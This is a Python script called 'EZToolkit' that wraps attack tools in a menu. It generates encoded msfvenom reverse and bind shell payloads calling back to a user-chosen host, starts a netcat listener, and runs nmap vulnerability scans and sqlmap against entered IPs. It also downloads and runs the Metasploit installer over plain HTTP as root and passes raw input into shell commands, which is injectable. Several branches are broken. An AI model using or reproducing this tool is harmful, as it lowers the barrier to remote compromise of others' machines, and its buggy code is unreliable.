# Code written by Wh1ppedKreem
# My Github profile https://github.com/Wh1ppedKreem
# [Insert code license information here]
import os
import re

# The class that is responsible for adding colour to this script
class tc:  # tc in this case stands for terminal colours
    BLACK = "\u001b[30m" 
    RED = "\u001b[31m"
    GREEN = "\u001b[32m"
    YELLOW = "\u001b[33m"
    BLUE = "\u001b[34m"
    MAGENTA = "\u001b[35m"
    CYAN = "\u001b[36m"
    WHITE = "\u001b[37m"
    RESET = "\u001b[0m"

# All banners and options start below
# Hand-made ASCII art by me ;)
BANNER = f"""\
{tc.MAGENTA}************************************************************************************{tc.RESET}
{tc.MAGENTA}*      _____________  ____________                  ___    ___   ___   ___________ {tc.RESET}{tc.MAGENTA}*{tc.RESET}
{tc.MAGENTA}*     /  _______   / /____   ____/                 /  /   /  / _/ _/  /  __   ___/ {tc.RESET}{tc.MAGENTA}*{tc.RESET}
{tc.MAGENTA}*    /  / __   /  /      /  /  _________________  /  /   /  /_/ _/   /  / /  /     {tc.RESET}{tc.MAGENTA}*{tc.RESET}
{tc.MAGENTA}*   /    __/  /  /      /  /  /  __   //  __   / /  /   /  __  /    /  / /  /      {tc.RESET}{tc.MAGENTA}*{tc.RESET}
{tc.MAGENTA}*  /  /______/  /___   /  /  /  /_/  //  /_/  / /  /___/  / /_ /_  /  / /  /       {tc.RESET}{tc.MAGENTA}*{tc.RESET}
{tc.MAGENTA}* /________________/  /__/  /_______//_______/ /_________/   /__/ /__/ /__/        {tc.RESET}{tc.MAGENTA}*{tc.RESET}
{tc.MAGENTA}*{tc.RESET}{tc.BLUE} By Wh1ppedKreem                                                 {tc.RESET}{tc.MAGENTA}*{tc.RESET}
{tc.MAGENTA}*{tc.RESET}{tc.BLUE} Follow me on Github: https://github.com/Wh1ppedKreem                             {tc.RESET}{tc.MAGENTA}*{tc.RESET}
{tc.MAGENTA}*{tc.RESET}{tc.RED} [!] Do not use this tool for illegal purposes.                                   {tc.RESET}{tc.MAGENTA}*{tc.RESET}
{tc.MAGENTA}************************************************************************************{tc.RESET}
"""

OPTIONS = f"""
{tc.GREEN}
Select An Option: 
[1] Generate A Payload
[2] Scan A Network 
[3] SQL Injection
[4] OSINT
[5] DoS Attack
[5] Help
[6] Download The Requirements
[99] Quit
{tc.RESET}
"""

NMAPBANNER = f"""
{tc.BLUE}
______ ______ ______ __   _
|_____ |      |____| | \  |
______||_____ |    | |  \_|
{tc.RESET}
"""

NMAPOPTIONS = f"""
{tc.GREEN}
Select Scan Intensity: 
[1] Stealth Scan (May take a while)
[2] Light Scan
[3] Moderate Scan
[4] Intense Scan
[5] Super Scan
[99] Return To Main Menu
{tc.RESET}
"""

SQLINJECTIONBANNER = f"""
{tc.BLUE}
______ ______  _     ___
|_____ |    \| |      |
______||_____\ |____ _|_
{tc.RESET}
"""

SQLINJECTIONOPTIONS = f"""
{tc.GREEN}
[1] Light Scan
[2] Moderate Scan
[3] Intense Scan
[4] Super Scan
[99] Return To Main Menu
{tc.RESET}
"""

# Regular expression for an IP address
ip_regex_pattern = (r"^(\d{1,3}\.){3}\d{1,3}$")

# This function checks to see if the input by the user matches the regular expression of an IP address
def is_ip_address(ip_address):
    return bool(re.match(ip_regex_pattern, ip_address))

# Regular expression for a port
port_regex_pattern = (r"^((6553[0-5])|(655[0-2][0-9])|(65[0-4][0-9]{2})|(6[0-4][0-9]{3})|([1-5][0-9]{4})|([0-5]{0,5})|([0-9]{1,4}))$")

# This function checks to see if the input by the user matches the regular expression of a port.
def is_valid_port(portSelection):
    return bool(re.match(port_regex_pattern, portSelection))

# This function takes the users input and displays an error message if it is not valid. Credit for this piece of code goes to https://github.com/HBalable
def get_user_choice(is_valid_option, prompt, invalid_message=None):
    option = input(prompt).strip()
    while not is_valid_option(option):
        if invalid_message is None:
            print(f"Invalid option: {option}")
        else:
            print(invalid_message.format(option=option))
        option = input(prompt).strip()
    return option

# Main Function
def main():
    print(BANNER)
    while True:
        if os.geteuid() != 0:
            print(f"{tc.YELLOW}[!] EZToolkit requires root privelages! Try running \"Run sudo python3 eztoolkit.py\" to fix your issue.{tc.RESET}")
            quit()
        print(OPTIONS)
        choice = int(input("Enter an option [1-6] [99 to exit]: "))

        if choice == 99:
            print("Quitting...")
            quit()

        # Requirements' download script starts here
        if choice == 6:
            operatingSystem = int(input("Are you on [1]windows, [2]mac or [3]linux? (type corresponding numbers): "))
            if operatingSystem == 1:
                print("Add manually for now.")
            elif operatingSystem == 2:
                print("Add manually for now.")
            elif operatingSystem == 3:
                importantupdatechoice = int(input("Are you using an [1]Debian-based distro or [2]Arch-based distro: "))
                if importantupdatechoice == 1:
                    os.system("wget http://downloads.metasploit.com/data/releases/metasploit-latest-linux-x64-installer.run")
                    os.system("chmod +x ./metasploit-latest-linux-x64-installer.run")
                    os.system("./metasploit-latest-linux-x64-installer.run")
                    os.system("apt install nmap")
                    os.system("apt install sqlmap")
                    os.system("apt install perl")
                    os.system("apt install netcat")
                elif importantupdatechoice == 2:
                    print("I have no clue how to install metasploit on Arch-based distros.")
                    os.system("pacman -S nmap")
                    os.system("pacman -S sqlmap")
                    os.system("pacman -S perl")
                    os.system("pacman -S netcat")
                elif (operatingSystem > 3) or (operatingSystem == ""):
                    print(f"{tc.RED}[!] Unsupported/Invalid option.{tc.RESET}")
                else:
                    break
        
        # msfvenom payload + netcat listener scripts start here 
        if choice == 1:
            print(f"{tc.GREEN}Your payload will automatically be encoded with shikata_ga_nai{tc.RESET}")
            msfvPlatform = input("Type a valid operating system for the payload[windows/mac/linux/android]: ")
            reverseConnection = input("Pick between [reverse_tcp], [bind_tcp], [reverse_http], [reverse_https] (type EXACTLY as shown or the command will fail): ")
            lhost = get_user_choice(
                is_ip_address, 
                "Enter LHOST: ",
                "Invalid IP address, try again."
            )
            lport = input("Enter LPORT: ")
            payloadExtension = input("Enter a file extension for the payload [py/exe/sh/or any other compatible] (type EXACTLY as shown): ")
            payloadName = input("Enter a name for the payload: ")
            os.system(f"msfvenom --platform {msfvPlatform} -p {msfvPlatform}/shell/{reverseConnection} lhost={lhost} lport={lport} -e x86/shikata_ga_nai -f {payloadExtension} > {payloadName}.{payloadExtension}")
            listenerChoice = str(input("Would you like to setup a listener? [y/n]: "))
            if (listenerChoice == "y") or (listenerChoice == "Y"):
                listenerPort = get_user_choice(
                is_valid_port, 
                "Enter the port for the listener >>> ", 
                "Invalid port, try again."
                )
                os.system(f"nc -nvlp {listenerPort}")
            elif (listenerChoice == "n") or (listenerChoice == "N"):
                print("No listener has been set.")
                return main()
            elif listenerChoice != ("y", "Y", "n", "N"):
                print("Invalid Option - returning to main menu.")
                return main()
        # Nmap script starts here
        elif choice == 2:
            print(NMAPBANNER, NMAPOPTIONS)
            nmapChoice = int(input("Enter a choice [1-5] [99 to return to main menu]: "))
            # Returns to main menu
            if nmapChoice == 99:
                return main()
            # Prompts user to input desired IP address
            ip_address = get_user_choice(
                is_ip_address, 
                "Enter the IP address you would like to scan >>> ", 
                "Invalid IP address, try again."
            )
            # Prompts user to input desired port
            nmapPortSelection = get_user_choice(
                is_valid_port, 
                "Enter the port you would like to scan >>> ", 
                "Invalid port, try again."
            )
            if nmapChoice == 1:
                # Stealth Scan
                os.system(f"nmap -T0 {ip_address} -p {nmapPortSelection}")
            elif nmapChoice == 2:
                # Light Scan
                os.system(f"nmap -T3 {ip_address} -p {nmapPortSelection}")
            elif nmapChoice == 3:
                # Moderate Scan
                os.system(f"nmap -sC -sV -O {ip_address} -p {nmapPortSelection}")
            elif nmapChoice == 4:
                # Intense Scan
                os.system(f"nmap -sC -sV -O --script vuln -T6 {ip_address} -p {nmapPortSelection}")
            elif choice == 5:
                # Super Scan
                verbosity_level = input("Select the level of verbosity (the mount of info shown) (1/2/3) >>> ")
                verbosity_args = f"-{'v'*{verbosity_level}}"
                os.system(f"nmap -sC -sV -O --script vuln -T6 {verbosity_args} {ip_address} -p {nmapPortSelection}")
            else:
                # Returns to the beginning of the function once complete
                return main()
        elif choice == 3:
            print(SQLINJECTIONBANNER, SQLINJECTIONOPTIONS)
            sqlChoice = int(input("Enter a choice [1-4] [99 to return to main menu]"))
            # Returns to main menu
            if sqlChoice == 99:
                return main()
            # Prompts user to input desired IP address
            ip_address = get_user_choice(
                is_ip_address,
                "Enter the IP address you would like to attack >>> ",
                "Invalid IP address, try again."
            )
            if sqlChoice == 1:
                # Light Scan
                os.system(f"sqlmap {ip_address}")


if __name__ == "__main__":
    main()